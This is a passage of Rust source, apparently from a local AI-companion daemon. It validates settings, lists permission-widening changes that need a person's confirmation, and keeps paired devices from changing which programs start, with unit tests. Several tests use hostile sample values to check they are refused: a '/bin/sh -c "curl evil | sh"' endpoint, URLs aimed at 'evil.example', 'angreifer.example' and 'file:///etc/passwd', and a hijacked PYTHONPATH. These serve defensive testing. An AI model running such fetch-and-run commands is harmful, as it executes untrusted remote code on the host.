            conversation_style: ConversationStyle::default(),
            address_form: AddressForm::default(),
            figure_name: DEFAULT_FIGURE_NAME.to_owned(),
            introduced: false,
            endpoints: EndpointConfig::default(),
            network: NetworkSettings::default(),
            voice_server: VoiceServerSettings::default(),
            location: LocationSettings::default(),
            weather_enabled: true,
            places_enabled: true,
            web_research_enabled: true,
            proactive: ProactiveSettings::default(),
            subagent_condensation_enabled: true,
            worlds: WorldsSettings::default(),
        }
    }
}

/// Why a settings document cannot be used.
#[derive(Debug, Error, PartialEq)]
pub enum InvalidSettings {
    #[error("the settings say schema version {found}, this build understands {expected}")]
    UnknownSchema { found: u32, expected: u32 },
    #[error("a budget limit of {percent} per cent is not a share of anything")]
    BudgetOutOfRange { percent: u8 },
    #[error("the figure needs a name")]
    NamelessFigure,
    #[error("the name of the figure is longer than {limit} characters")]
    FigureNameTooLong { limit: usize },
    #[error("a speech path was set for an adapter without a name")]
    NamelessAdapterVoice,
    #[error("the network listener is on but has no address to bind")]
    NetworkWithoutAddress,
    #[error("port 0 is not a port the network listener can be reached on")]
    NetworkWithoutPort,
    #[error("the speech server is switched on but no command says what to start")]
    VoiceServerWithoutCommand,
    #[error(
        "the speech server is switched on but no url says how to tell that it is running; \
         without one the daemon would speak into a server that is still loading its model"
    )]
    VoiceServerWithoutReadyUrl,
    #[error(
        "the readiness url {url} of the speech server does not point at this machine; the \
         daemon starts that server here, so the answer of a server somewhere else would be \
         the proof that a local one is running"
    )]
    VoiceServerReadyUrlNotLocal { url: String },
    #[error("a latitude of {latitude} is not a point on the earth")]
    LatitudeOutOfRange { latitude: f64 },
    #[error("a longitude of {longitude} is not a point on the earth")]
    LongitudeOutOfRange { longitude: f64 },
    #[error("the worlds are read every {seconds} seconds, and the shortest interval is {minimum}")]
    WorldPollTooShort { seconds: u32, minimum: u32 },
    #[error(
        "{machine:?} is neither \"lokal\" nor a destination ssh can take without reading an \
         option out of it"
    )]
    WorldMachineInvalid { machine: String },
    #[error("the workbench directory {dir:?} is neither an absolute path nor one under ~/")]
    WorldCliDirNotAbsolute { dir: String },
    #[error(transparent)]
    Endpoints(#[from] EndpointError),
}

impl Settings {
    /// Whether an adapter should be loaded at all.
    pub fn adapter_enabled(&self, id: &str, default: AdapterDefault) -> bool {
        let named = self.enabled_adapters.iter().any(|name| name == id);
        match default {
            AdapterDefault::On => named || self.enabled_adapters.is_empty(),
            AdapterDefault::OptIn => named,
        }
    }

    /// The speech path for one adapter, and the careful default for one nobody has
    /// decided about yet.
    ///
    /// The default is [`VoicePath::Companion`] for every adapter, including one that has
    /// speech of its own: passing speech through is something somebody chooses for an
    /// agent they know can speak, never something that happens because a key is missing
    /// from a file.
    pub fn voice_path(&self, adapter_id: &str) -> VoicePath {
        self.adapter_voice
            .get(adapter_id)
            .copied()
            .unwrap_or_default()
    }

    /// Everything that makes this document unusable, checked in one place.
    ///
    /// The same check runs when the file is read and when a client sends a document over
    /// the socket, so a settings page cannot write anything the daemon would refuse to load
    /// on the next start.
    pub fn validate(&self) -> Result<(), InvalidSettings> {
        if self.schema_version > SETTINGS_SCHEMA_VERSION {
            return Err(InvalidSettings::UnknownSchema {
                found: self.schema_version,
                expected: SETTINGS_SCHEMA_VERSION,
            });
        }
        if self.budget_limit_percent > 100 {
            return Err(InvalidSettings::BudgetOutOfRange {
                percent: self.budget_limit_percent,
            });
        }
        let name = self.figure_name.trim();
        if name.is_empty() {
            return Err(InvalidSettings::NamelessFigure);
        }
        if name.chars().count() > MAX_FIGURE_NAME_LEN {
            return Err(InvalidSettings::FigureNameTooLong {
                limit: MAX_FIGURE_NAME_LEN,
            });
        }
        if self
            .adapter_voice
            .keys()
            .any(|adapter| adapter.trim().is_empty())
        {
            return Err(InvalidSettings::NamelessAdapterVoice);
        }
        if self.network.enabled {
            if self.network.bind_address.trim().is_empty() {
                return Err(InvalidSettings::NetworkWithoutAddress);
            }
            if self.network.port == 0 {
                return Err(InvalidSettings::NetworkWithoutPort);
            }
        }
        if self.voice_server.enabled {
            if self
                .voice_server
                .command
                .first()
                .is_none_or(|program| program.trim().is_empty())
            {
                return Err(InvalidSettings::VoiceServerWithoutCommand);
            }
            let ready_url = self.voice_server.ready_url.trim();
            if ready_url.is_empty() {
                return Err(InvalidSettings::VoiceServerWithoutReadyUrl);
            }
            if !is_loopback_url(ready_url) {
                return Err(InvalidSettings::VoiceServerReadyUrlNotLocal {
                    url: ready_url.to_owned(),
                });
            }
        }
        if let Some(latitude) = self.location.latitude {
            if !(-90.0..=90.0).contains(&latitude) {
                return Err(InvalidSettings::LatitudeOutOfRange { latitude });
            }
        }
        if let Some(longitude) = self.location.longitude {
            if !(-180.0..=180.0).contains(&longitude) {
                return Err(InvalidSettings::LongitudeOutOfRange { longitude });
            }
        }
        if self.worlds.enabled && self.worlds.poll_seconds < MIN_WORLD_POLL_SECONDS {
            return Err(InvalidSettings::WorldPollTooShort {
                seconds: self.worlds.poll_seconds,
                minimum: MIN_WORLD_POLL_SECONDS,
            });
        }
        for source in &self.worlds.sources {
            let machine = source.machine.trim();
            if machine != LOCAL_WORLD_MACHINE && !is_ssh_destination(machine) {
                return Err(InvalidSettings::WorldMachineInvalid {
                    machine: source.machine.clone(),
                });
            }
            let dir = source.cli_dir.trim();
            if !dir.is_empty() && !dir.starts_with('/') && !dir.starts_with("~/") {
                return Err(InvalidSettings::WorldCliDirNotAbsolute {
                    dir: source.cli_dir.clone(),
                });
            }
        }
        self.endpoints.validate()?;
        Ok(())
    }

    /// What `next` would raise that only a person may raise, each in one line.
    ///
    /// `DESIGN.md` § Sicherheit: mail, push and publish stand on `ask`, and only the person
    /// puts them on `full`, with a warning. The same holds for every other step that widens
    /// what runs without being asked — a boundary going to `full`, the companion acting on
    /// its own, a channel that leaves the machine, and the adapter that runs a foreign CLI,
    /// which no permission level can restrain.
    ///
    /// `DESIGN.md` § Voice adds one more class that is not about what runs but about what
    /// goes out: a cloud endpoint on a speech role, "weil Audio die Maschine verlässt".
    /// [`endpoint_leaves_the_machine`] is what decides that, and the roles are `stt`, `s2s`
    /// and `tts`.
    ///
    /// Only the direction matters. Lowering a boundary, dropping a channel or switching the
    /// terminal adapter off is nobody's risk and needs no confirmation.
    pub fn high_risk_changes(&self, next: &Settings) -> Vec<String> {
        let mut raised = Vec::new();

        let mut boundary = |what: &str, before: ToolBoundary, after: ToolBoundary| {
            if after > before && after == ToolBoundary::Full {
                raised.push(format!(
                    "{what} goes from {} to {}",
                    before.as_str(),
                    after.as_str()
                ));
            }
        };
        boundary(
            "the boundary of the companion's own tools",
            self.tool_boundary,
            next.tool_boundary,
        );
        boundary(
            "the boundary of a spawned session",
            self.agent_boundary,
            next.agent_boundary,
        );
        boundary("mail", self.high_risk.mail, next.high_risk.mail);
        boundary("push", self.high_risk.push, next.high_risk.push);
        boundary("publish", self.high_risk.publish, next.high_risk.publish);

        if next.autonomy > self.autonomy && next.autonomy == Autonomy::Act {
            raised.push("the companion acts on its own within the job file".to_owned());
        }

        if next.location.allow_system_location && !self.location.allow_system_location {
            raised.push(
                "the companion may ask macOS for this machine's location for the weather and \
                 places tools"
                    .to_owned(),
            );
        }

        for channel in &next.notification_channels {
            if channel.leaves_the_machine() && !self.notification_channels.contains(channel) {
                raised.push(format!("{channel:?} sends a message off this machine"));
            }
        }

        if next.network.enabled {
            if !self.network.enabled {
                raised.push(format!(
                    "the daemon listens on {} for devices, where the account check of the \
                     local socket does not apply",
                    next.network.socket_address()
                ));
            } else {
                // Switching the port on is not the only step that widens it. Going from
                // the careful default of loopback to one interface, or from one interface
                // to every interface, changes who can reach the daemon at all, and it is
                // the bigger of the two steps rather than the smaller one.
                if next.network.reach() > self.network.reach() {
                    raised.push(format!(
                        "the network port moves from {} to {}, so it is reachable from \
                         further away than before",
                        self.network.bind_address, next.network.bind_address
                    ));
                }
                // A port is neither wider nor narrower, but moving the listener while
                // devices are on it is a change to the door itself, and a person should
                // see it. Narrowing the address alone is nobody's risk and is not here.
                if next.network.port != self.network.port {
                    raised.push(format!(
                        "the network port moves from {} to {} while it is open",
                        self.network.port, next.network.port
                    ));
                }
            }
        }

        // A cloud endpoint on a speech role. `DESIGN.md` § Voice puts this on the same rung
        // as a permanently listening wakeword and as the network port, and for the same
        // reason: what goes there is not a request, it is the room the person is sitting in.
        //
        // Raised is every profile that newly takes audio (or the spoken answer) off this
        // machine on the role: a provider the chain already carried is known and does not
        // warn again, so reordering a fallback chain stays silent, but a NEW provider does
        // warn even when another one was already outside — the room the person sits in
        // reaching a second company is a second fact, not the same one. (Comment aligned
        // with the code on 2026-09-03; it used to describe a per-role step that the code
        // never implemented, and the Swift mirror follows the code.)
        for (role, what_leaves) in [
            (
                EndpointRole::Stt,
                "what is spoken into the microphone leaves it",
            ),
            (
                EndpointRole::S2s,
                "what is spoken into the microphone leaves it",
            ),
            // Not named in `DESIGN.md` § Voice, which says STT and S2S. Added here on
            // 2026-09-03 with the same reasoning one step further: the text a TTS endpoint
            // is given is the answer the companion is about to say out loud, and that answer
            // quotes session output and job files. Audio going out and the spoken text going
            // out are the same person's business.
            (
                EndpointRole::Tts,
                "every sentence the companion says leaves it",
            ),
        ] {
            let known: Vec<&str> = self
                .endpoints
                .chain(role)
                .into_iter()
                .filter(|profile| endpoint_leaves_the_machine(profile))
                .map(|profile| profile.id.as_str())
                .collect();
            for profile in next.endpoints.chain(role) {
                if !endpoint_leaves_the_machine(profile) || known.contains(&profile.id.as_str()) {
                    continue;
                }
                raised.push(format!(
                    "the role {} goes to the endpoint {} at {}, which is not this machine, so \
                     {what_leaves}",
                    role.as_str(),
                    profile.id,
                    host_of(&profile.url)
                ));
            }
        }

        let had_pty = self.adapter_enabled(PTY_ADAPTER_ID, AdapterDefault::OptIn);
        let wants_pty = next.adapter_enabled(PTY_ADAPTER_ID, AdapterDefault::OptIn);
        if wants_pty && !had_pty {
            raised.push(
                "the generic terminal adapter starts a foreign CLI, and no permission level \
                 of this program restrains it"
                    .to_owned(),
            );
        }

        // Starting a program named in a settings file is the same class of step as the
        // terminal adapter above: what runs then is not restrained by any permission level
        // of this program. Switching the speech server on is one, and so is changing what it
        // starts while it is on — a swapped command is a different program.
        if next.voice_server.enabled {
            if !self.voice_server.enabled {
                raised.push(format!(
                    "the daemon starts {} itself when speech is used, and no permission \
                     level of this program restrains what it does",
                    next.voice_server.display_command()
                ));
            } else {
                // Switching it on is not the only step that decides which program runs.
                // `python3 -m mlx_audio.server` is a different program under a different
                // PATH or PYTHONPATH, and a readiness url that moves decides which server
                // counts as the one that came up. All three are the same question.
                if next.voice_server.command != self.voice_server.command {
                    raised.push(format!(
                        "the speech server the daemon starts changes from {} to {}",
                        self.voice_server.display_command(),
                        next.voice_server.display_command()
                    ));
                }
                if next.voice_server.env != self.voice_server.env {
                    raised.push(
                        "the environment the speech server is started with changes, and that \
                         decides which program a command like `python3 -m …` really runs"
                            .to_owned(),
                    );
                }
                if next.voice_server.ready_url != self.voice_server.ready_url {
                    raised.push(format!(
                        "the daemon tells the speech server apart by {} instead of {}",
                        next.voice_server.ready_url, self.voice_server.ready_url
                    ));
                }
            }
        }

        raised
    }
}

impl Settings {
    /// What a paired device may not change about this document, each in one line.
    ///
    /// `DESIGN.md` § Mobil, Freigaben vom Handy allows a high-risk setting to be raised from
    /// the phone and demands two things for it in the same breath: at least the device-code
    /// confirmation of the system, and a record that names the device and the way it was
    /// confirmed. `set_settings` has neither — its `confirm_high_risk` is a flag the same
    /// client sets that wants the change, and nothing is written down. Until both exist, a
    /// device raises nothing.
    ///
    /// The speech server is closed for a device beyond that, in either direction: its
    /// content is a program that the daemon starts on this machine at the next spoken word.
    /// The same holds for the command of the terminal adapter, for exactly the same reason —
    /// changing it while the adapter is already on is not a raise and would otherwise slip
    /// past the line above.
    ///
    /// The endpoints are closed for a device as a whole, and not only their `cli` half
    /// (added 2026-09-03 after the security review): a `cli` profile *is* a program with
    /// arguments that the daemon starts, which is the same sentence as the two above, and an
    /// http profile decides which address a stored key and the whole conversation are sent
    /// to. Every field of a profile takes part in that — a url, an argument list, the model,
    /// the name of the key, and the role binding that decides which profile is used at all —
    /// so the fence is drawn around the document rather than around the fields somebody
    /// thought of. A device that wants a different provider asks the person at the machine.
    ///
    /// This says nothing about the shell of the person at the machine. That one is not a
    /// device, it reaches the daemon through a socket only its own account can open, and it
    /// keeps raising a setting with the warning in front of the person.
    pub fn device_forbidden_changes(&self, next: &Settings) -> Vec<String> {
        let mut refused = self.high_risk_changes(next);
        if next.voice_server != self.voice_server {
            refused.push(
                "the speech server is a program this machine starts, and a device does not \
                 decide which one"
                    .to_owned(),
            );
        }
        if next.worlds != self.worlds {
            refused.push(
                "where the worlds are read names programs this machine starts and machines it \
                 connects to, and a device does not decide which"
                    .to_owned(),
            );
        }
        if next.pty_command != self.pty_command {
            refused.push(
                "the command of the terminal adapter is a program this machine starts, and a \
                 device does not decide which one"
                    .to_owned(),
            );
        }
        if next.endpoints != self.endpoints {
            refused.push(
                "the endpoints decide which program this machine starts and which address a \
                 stored key and the conversation are sent to; they belong to the person at \
                 the machine"
                    .to_owned(),
            );
        }
        if next.skill_level != self.skill_level {
            refused.push(
                "the skill tier changes global agent instructions and belongs to the person at \
                 the machine"
                    .to_owned(),
            );
        }
        // The address that goes into the next pairing code. It is not a raise — the code
        // carries the real fingerprint of this daemon, so a wrong address breaks a pairing
        // rather than diverting one — but which address this machine tells a phone about is
        // not a device's to decide either.
        if next.network.advertise_address != self.network.advertise_address {
            refused.push(
                "the address the next pairing code points at is the person's to name".to_owned(),
            );
        }
        refused
    }
}

impl VoiceServerSettings {
    /// The command as one line, for a warning a person reads. Never quoted or escaped for a
    /// shell: there is no shell in this path, and a line that looked like one would invite
    /// somebody to paste it into one.
    pub fn display_command(&self) -> String {
        if self.command.is_empty() {
            return "nothing".to_owned();
        }
        self.command.join(" ")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::endpoint_config::{EndpointProfile, RoleBinding, SAY_PROFILE_ID};
    use crate::{EndpointProtocol, EndpointRole};

    #[test]
    fn the_readiness_url_of_the_speech_server_has_to_point_at_this_machine() {
        // The daemon starts that server here, so an address somewhere else can only give a
        // wrong answer: a server on another machine would prove that a local one is running.
        let mut settings = Settings {
            voice_server: VoiceServerSettings {
                enabled: true,
                command: vec!["python3".to_owned()],
                ready_url: "http://127.0.0.1:8765/v1/models".to_owned(),
                ..VoiceServerSettings::default()
            },
            ..Settings::default()
        };
        settings.validate().expect("loopback is what it wants");

        for url in [
            "http://example.com/",
            "https://10.0.0.5:8765/",
            "http://127.0.0.1@evil.example/",
            "127.0.0.1:8765",
            "file:///etc/passwd",
        ] {
            settings.voice_server.ready_url = url.to_owned();
            assert!(
                matches!(
                    settings.validate(),
                    Err(InvalidSettings::VoiceServerReadyUrlNotLocal { .. })
                ),
                "{url} must not count as this machine"
            );
        }

        for url in [
            "http://localhost:8765/",
            "http://[::1]:8765/v1/models",
            "https://127.0.0.9/",
        ] {
            settings.voice_server.ready_url = url.to_owned();
            settings
                .validate()
                .unwrap_or_else(|error| panic!("{url}: {error}"));
        }
    }

    #[test]
    fn everything_that_decides_which_speech_server_runs_needs_a_person() {
        // A changed command is an obvious one. The environment decides it just as much for a
        // command like `python3 -m …`, and a moved readiness url decides which server counts
        // as the one that came up.
        let before = Settings {
            voice_server: VoiceServerSettings {
                enabled: true,
                command: vec!["python3".to_owned()],
                ready_url: "http://127.0.0.1:8765/".to_owned(),
                ..VoiceServerSettings::default()
            },
            ..Settings::default()
        };

        let mut env_changed = before.clone();
        env_changed
            .voice_server
            .env
            .insert("PYTHONPATH".to_owned(), "/tmp/theirs".to_owned());
        assert_eq!(before.high_risk_changes(&env_changed).len(), 1);

        let mut url_changed = before.clone();
        url_changed.voice_server.ready_url = "http://127.0.0.1:9999/".to_owned();
        assert_eq!(before.high_risk_changes(&url_changed).len(), 1);

        // And switching it off is nobody's risk.
        let mut off = before.clone();
        off.voice_server.enabled = false;
        assert!(before.high_risk_changes(&off).is_empty());
    }

    #[test]
    fn a_device_changes_neither_a_raise_nor_a_program_this_machine_starts() {
        let before = Settings::default();

        let mut raising = before.clone();
        raising.autonomy = Autonomy::Act;
        assert_eq!(before.device_forbidden_changes(&raising).len(), 1);

        // Not a raise while the terminal adapter is off, and still closed for a device.
        let mut terminal = before.clone();
        terminal.pty_command = vec!["/bin/sh".to_owned()];
        assert!(before.high_risk_changes(&terminal).is_empty());
        assert_eq!(before.device_forbidden_changes(&terminal).len(), 1);

        // The idle timer of a speech server that is off is still part of it.
        let mut idle = before.clone();
        idle.voice_server.idle_timeout_seconds = 30;
        assert!(before.high_risk_changes(&idle).is_empty());
        assert_eq!(before.device_forbidden_changes(&idle).len(), 1);

        let mut skills = before.clone();
        skills.skill_level = SkillLevel::Many;
        assert_eq!(before.device_forbidden_changes(&skills).len(), 1);

        // An ordinary setting is not a fence.
        let mut ordinary = before.clone();
        ordinary.figure_name = "Kobold".to_owned();
        assert!(before.device_forbidden_changes(&ordinary).is_empty());
    }

    #[test]
    fn a_device_changes_no_endpoint_at_all() {
        // The hole this closes: a `cli` profile is a program plus arguments, and the driver
        // starts it verbatim. Every one of these passed `device_forbidden_changes` before
        // 2026-09-03, so a device of the level `control` could run any program it liked by
        // writing a profile and binding a role to it.
        let before = Settings {
            endpoints: EndpointConfig::empty()
                .with_profile(EndpointProfile::local(
                    "lokal",
                    EndpointProtocol::OpenaiCompat,
                    "http://127.0.0.1:8765",
                ))
                .with_role(EndpointRole::ChatLlm, RoleBinding::new("lokal")),
            ..Settings::default()
        };

        // A new cli profile, which is a program with arguments.
        let mut added = before.clone();
        added.endpoints.profiles.push(EndpointProfile {
            id: "shell".to_owned(),
            protocol: EndpointProtocol::Cli,
            url: "/bin/sh".to_owned(),
            key_ref: None,
            model: None,
            voice: None,
            args: vec!["-c".to_owned(), "curl evil | sh".to_owned()],
            language: None,
            reasoning_effort: None,
        });
        assert_eq!(before.device_forbidden_changes(&added).len(), 1);

        // The url of a profile that is already bound.
        let mut moved = before.clone();
        moved.endpoints.profiles[0].url = "https://angreifer.example".to_owned();
        assert_eq!(before.device_forbidden_changes(&moved).len(), 1);

        // The arguments of a profile.
        let mut arguments = before.clone();
        arguments.endpoints.profiles[0].args = vec!["--yolo".to_owned()];
        assert_eq!(before.device_forbidden_changes(&arguments).len(), 1);

        // The name of the key a profile uses, which is what would let one profile borrow
        // the key of another.
        let mut borrowed = before.clone();
        borrowed.endpoints.profiles[0].key_ref = Some("lokal".to_owned());
        assert_eq!(before.device_forbidden_changes(&borrowed).len(), 1);

        // Binding a role to a different profile, without touching a profile at all.
        let mut rebound = before.clone();
        rebound.endpoints.profiles.push(EndpointProfile::local(
            "zweit",
            EndpointProtocol::Ollama,
            "http://127.0.0.1:11434",
        ));
        rebound
            .endpoints
            .roles
            .insert(EndpointRole::ChatLlm, RoleBinding::new("zweit"));
        assert_eq!(before.device_forbidden_changes(&rebound).len(), 1);

        // And none of these is a high-risk change, so the fence above would not have caught
        // them either.
        assert!(before.high_risk_changes(&added).is_empty());
        assert!(before.high_risk_changes(&arguments).is_empty());
    }

    #[test]
    fn putting_a_speech_role_on_a_cloud_endpoint_needs_a_person() {
        let before = Settings {
            endpoints: EndpointConfig::empty()
                .with_profile(EndpointProfile::local(
                    "whisper-lokal",
                    EndpointProtocol::WhisperServer,
                    "http://127.0.0.1:8080",
                ))
                .with_profile(EndpointProfile::say())
                .with_role(EndpointRole::Stt, RoleBinding::new("whisper-lokal"))
                .with_role(EndpointRole::Tts, RoleBinding::new(SAY_PROFILE_ID)),
            ..Settings::default()
        };

        // The microphone: the whole point of the rule.
        let mut cloud_stt = before.clone();
        cloud_stt.endpoints.profiles.push(EndpointProfile {
            id: "openai".to_owned(),
            protocol: EndpointProtocol::OpenaiCompat,
            url: "https://api.openai.com/v1".to_owned(),
            key_ref: Some("openai".to_owned()),
            model: Some("whisper-1".to_owned()),
            voice: None,
            args: Vec::new(),
            language: None,
            reasoning_effort: None,
        });
        cloud_stt
            .endpoints
            .roles
            .insert(EndpointRole::Stt, RoleBinding::new("openai"));
        assert_eq!(
            before.high_risk_changes(&cloud_stt),
            vec![
                "the role stt goes to the endpoint openai at api.openai.com, which is not this \
                 machine, so what is spoken into the microphone leaves it"
                    .to_owned()
            ]
        );

        // A fallback counts too: the chain is what the daemon works with, not the primary.
        let mut fallback = before.clone();
        fallback.endpoints.profiles.push(EndpointProfile::local(
            "peer",
            EndpointProtocol::WhisperServer,
            "http://peer.local:8080",
        ));
        fallback.endpoints.roles.insert(
            EndpointRole::Stt,
            RoleBinding::new("whisper-lokal").with_fallback("peer"),
        );
        assert_eq!(fallback.endpoints.chain(EndpointRole::Stt).len(), 2);
        assert_eq!(before.high_risk_changes(&fallback).len(), 1);

        // A profile that moves from this machine to somewhere else is the same step, even
        // though no binding changed.
        let mut moved = before.clone();
        moved.endpoints.profiles[0].url = "https://stt.example/v1".to_owned();
        assert_eq!(before.high_risk_changes(&moved).len(), 1);

        // The spoken answer, for the same reason one step further.
        let mut cloud_tts = before.clone();
        cloud_tts.endpoints.profiles.push(EndpointProfile {
            id: "eleven".to_owned(),
            protocol: EndpointProtocol::OpenaiCompat,
            url: "https://api.elevenlabs.io".to_owned(),
            key_ref: Some("eleven".to_owned()),
            model: None,
            voice: None,
            args: Vec::new(),
            language: None,
            reasoning_effort: None,
        });
        cloud_tts
            .endpoints
            .roles
            .insert(EndpointRole::Tts, RoleBinding::new("eleven"));
        assert_eq!(
            before.high_risk_changes(&cloud_tts),
            vec![
                "the role tts goes to the endpoint eleven at api.elevenlabs.io, which is not \
                 this machine, so every sentence the companion says leaves it"
                    .to_owned()
            ]
        );

        // What stays on the machine is nobody's warning: a local server, the `say` program,
        // and a chat model in the cloud, which is not a speech role.
        let mut local = before.clone();
        local.endpoints.profiles[0].url = "http://localhost:9000".to_owned();
        assert!(before.high_risk_changes(&local).is_empty());

        let mut chat = before.clone();
        chat.endpoints.profiles.push(EndpointProfile::local(
            "cloud-chat",
            EndpointProtocol::Anthropic,
            "https://api.anthropic.com",
        ));
        chat.endpoints
            .roles
            .insert(EndpointRole::ChatLlm, RoleBinding::new("cloud-chat"));
        assert!(before.high_risk_changes(&chat).is_empty());

        // And going back is not a raise.
        assert!(cloud_stt.high_risk_changes(&before).is_empty());
    }

    #[test]
    fn a_device_does_not_move_the_address_the_next_pairing_code_points_at() {
        let before = Settings::default();
        let mut moved = before.clone();
        moved.network.advertise_address = "angreifer.example".to_owned();

        // Not a raise — the code carries this daemon's own fingerprint — and still not a
        // device's to change.
        assert!(before.high_risk_changes(&moved).is_empty());
        assert_eq!(before.device_forbidden_changes(&moved).len(), 1);
    }

    #[test]
    fn the_defaults_are_the_careful_ones() {
        let settings = Settings::default();
        assert_eq!(
            settings.notification_channels,
            vec![NotificationChannel::Figure],
            "no channel that leaves the machine without being asked for"
        );
        assert!(settings.forward_done, "a finished run is worth saying");
        assert_eq!(settings.autonomy, Autonomy::Observe);
        assert_eq!(settings.tool_boundary, ToolBoundary::Ask);
        assert_eq!(settings.agent_boundary, ToolBoundary::Ask);
        assert_eq!(settings.high_risk.mail, ToolBoundary::Ask);
        assert_eq!(settings.high_risk.push, ToolBoundary::Ask);
        assert_eq!(settings.high_risk.publish, ToolBoundary::Ask);
        assert!(
            !settings.inventory_allowed,
            "reading somebody's work is asked for"
        );
        assert_eq!(settings.budget_limit_percent, 0);
        assert_eq!(settings.done_handling, DoneHandling::Forward);
        assert!(settings.subagent_condensation_enabled);
        assert!(settings.validate().is_ok());
    }

    #[test]
    fn an_adapter_nobody_decided_about_gets_the_companion_voice() {
        let settings = Settings::default();
        assert!(
            settings.adapter_voice.is_empty(),
            "a fresh file decides nothing about anybody's speech"
        );
        assert_eq!(settings.voice_path("hermes"), VoicePath::Companion);
        assert_eq!(settings.voice_path("workbench"), VoicePath::Companion);
    }

    #[test]
    fn a_speech_path_is_kept_per_adapter() {
        let settings = Settings {
            adapter_voice: BTreeMap::from([
                ("hermes".to_owned(), VoicePath::Passthrough),
                ("claude".to_owned(), VoicePath::Companion),
            ]),
            ..Settings::default()
        };
        assert_eq!(settings.voice_path("hermes"), VoicePath::Passthrough);
        assert_eq!(settings.voice_path("claude"), VoicePath::Companion);
        assert_eq!(
            settings.voice_path("codex"),
            VoicePath::Companion,
            "a choice for one agent says nothing about the next"
        );
        assert!(settings.validate().is_ok());
    }

    #[test]
    fn a_speech_path_survives_the_round_trip() {
        let settings = Settings {
            adapter_voice: BTreeMap::from([("hermes".to_owned(), VoicePath::Passthrough)]),
            ..Settings::default()
        };
        let text = serde_json::to_string(&settings).unwrap();
        assert!(
            text.contains("\"passthrough\""),
            "the wire form is the snake_case word, not a number: {text}"
        );
        let back: Settings = serde_json::from_str(&text).unwrap();
        assert_eq!(back, settings);
    }

    #[test]
    fn a_document_without_the_field_still_reads() {
        // Every settings file written before this field existed has to keep working, and
        // has to come back with the careful default rather than a missing key.
        let text = r#"{"schema_version":1,"figure_name":"Companion"}"#;
        let settings: Settings = serde_json::from_str(text).unwrap();
        assert!(settings.adapter_voice.is_empty());
        assert_eq!(settings.voice_path("hermes"), VoicePath::Companion);
        assert!(settings.validate().is_ok());
    }

    #[test]
    fn a_speech_path_without_an_adapter_is_refused() {
        let settings = Settings {
            adapter_voice: BTreeMap::from([("  ".to_owned(), VoicePath::Passthrough)]),
            ..Settings::default()
        };
        assert_eq!(
            settings.validate(),
            Err(InvalidSettings::NamelessAdapterVoice)
        );
    }

    #[test]
    fn choosing_a_speech_path_is_not_a_high_risk_change() {
        let before = Settings::default();
        let after = Settings {
            adapter_voice: BTreeMap::from([("hermes".to_owned(), VoicePath::Passthrough)]),
            ..Settings::default()
        };
        assert!(
            before.high_risk_changes(&after).is_empty(),
            "both paths speak on this machine to this person; neither needs a warning"
        );
        assert!(after.high_risk_changes(&before).is_empty());
    }

    #[test]
    fn an_opt_in_adapter_stays_off_until_it_is_named() {
        let quiet = Settings::default();
        assert!(
            quiet.adapter_enabled("workbench", AdapterDefault::On),
            "an empty list means every ordinary adapter"
        );
        assert!(
            !quiet.adapter_enabled(PTY_ADAPTER_ID, AdapterDefault::OptIn),
            "an empty list must not hand anybody a terminal adapter"
        );

        let chosen = Settings {
            enabled_adapters: vec![PTY_ADAPTER_ID.to_owned()],
            ..Settings::default()
        };
        assert!(chosen.adapter_enabled(PTY_ADAPTER_ID, AdapterDefault::OptIn));
        assert!(
            !chosen.adapter_enabled("workbench", AdapterDefault::On),
            "a filled list is a choice, and the others are not in it"
        );
    }

    #[test]
    fn a_document_from_an_older_build_gets_the_defaults_for_what_it_does_not_name() {
        // The compat rule of DESIGN.md § Architektur on the settings document: a shell that
        // predates the assistant answers sends the fields it knows and nothing else.
        let older: Settings = serde_json::from_str(
            r#"{"schema_version": 1, "autonomy": "ask", "tool_boundary": "read_only"}"#,
        )
        .unwrap();
        assert_eq!(older.autonomy, Autonomy::Ask);
        assert_eq!(older.tool_boundary, ToolBoundary::ReadOnly);
        assert_eq!(
            older.agent_boundary,
            ToolBoundary::Ask,
            "the careful default"
        );
        assert_eq!(older.figure_name, DEFAULT_FIGURE_NAME);
        assert_eq!(older.skill_level, SkillLevel::Recommended);
        assert_eq!(older.selected_skill_level, None);
    }

    #[test]
    fn the_wire_names_of_the_setup_answers_are_the_ones_the_shell_builds_against() {
        let settings = Settings {
            tool_boundary: ToolBoundary::ReadOnly,
            done_handling: DoneHandling::Reviewer,
            skill_level: SkillLevel::Many,
            conversation_style: ConversationStyle::Detailed,
            address_form: AddressForm::Formal,
            notification_channels: vec![
                NotificationChannel::Figure,
                NotificationChannel::SystemNotification,
            ],
            ..Settings::default()
        };
        let json = serde_json::to_value(&settings).unwrap();
        assert_eq!(json["tool_boundary"], "read_only");
        assert_eq!(json["done_handling"], "reviewer");
        assert_eq!(json["skill_level"], "many");
        assert!(json.get("selected_skill_level").is_none());
        assert_eq!(json["conversation_style"], "detailed");
        assert_eq!(json["address_form"], "formal");
        assert_eq!(json["notification_channels"][1], "system_notification");
    }

    #[test]
    fn a_budget_that_is_not_a_share_and_a_figure_without_a_name_are_refused() {
        let over = Settings {
            budget_limit_percent: 101,
            ..Settings::default()
        };
        assert_eq!(
            over.validate(),
            Err(InvalidSettings::BudgetOutOfRange { percent: 101 })
        );

        let nameless = Settings {
            figure_name: "   ".to_owned(),
            ..Settings::default()
        };
        assert_eq!(nameless.validate(), Err(InvalidSettings::NamelessFigure));

        let long = Settings {
            figure_name: "a".repeat(MAX_FIGURE_NAME_LEN + 1),
            ..Settings::default()
        };
        assert_eq!(
            long.validate(),
            Err(InvalidSettings::FigureNameTooLong {
                limit: MAX_FIGURE_NAME_LEN
            })
        );
    }

    #[test]
    fn a_key_in_the_endpoints_makes_the_whole_document_unusable() {
        let settings = Settings {
            endpoints: EndpointConfig::empty().with_profile(EndpointProfile {
                id: "cloud".to_owned(),
                protocol: EndpointProtocol::OpenaiCompat,
                url: "https://example.invalid".to_owned(),
                key_ref: Some("sk-0123456789".to_owned()),
                model: None,
                voice: None,
                args: Vec::new(),
                language: None,
                reasoning_effort: None,
            }),
            ..Settings::default()
        };
        assert!(matches!(
            settings.validate(),
            Err(InvalidSettings::Endpoints(
                EndpointError::KeyInSettings { .. }
            ))
        ));
    }

    #[test]
    fn raising_a_permission_is_named_and_lowering_one_is_not() {
        let before = Settings::default();

        let mut after = before.clone();
        after.high_risk.publish = ToolBoundary::Full;
        after.tool_boundary = ToolBoundary::Full;
        after.autonomy = Autonomy::Act;
        after.notification_channels.push(NotificationChannel::Push);
        after.enabled_adapters.push(PTY_ADAPTER_ID.to_owned());
        let raised = before.high_risk_changes(&after);
